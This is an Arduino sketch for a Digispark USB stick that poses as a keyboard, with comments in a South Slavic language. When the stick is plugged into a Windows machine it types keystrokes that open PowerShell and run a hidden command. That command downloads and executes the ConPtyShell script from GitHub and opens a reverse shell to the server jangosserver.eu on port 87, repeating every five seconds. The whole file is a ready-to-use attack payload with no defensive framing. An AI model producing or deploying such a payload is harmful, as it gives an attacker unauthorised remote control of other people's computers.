#define LAYOUT_GERMAN
#include "DigiKeyboard.h"

void setup() {
  delay(500);
  DigiKeyboard.disableLEDFeedback();
}

void loop() {
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Simulira pritisak Win + R i otvara run
  DigiKeyboard.delay(200); 

  DigiKeyboard.println("powershell"); // Otvara powershell
  DigiKeyboard.delay(200);

  DigiKeyboard.println("powershell -WindowStyle Hidden -Command \"IEX (IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell (Resolve-DnsName jangosserver.eu).IPAddress 87\""); // Ispise komandu za spajanje na listener
  DigiKeyboard.enableLEDFeedback();

  DigiKeyboard.delay(5000);
}
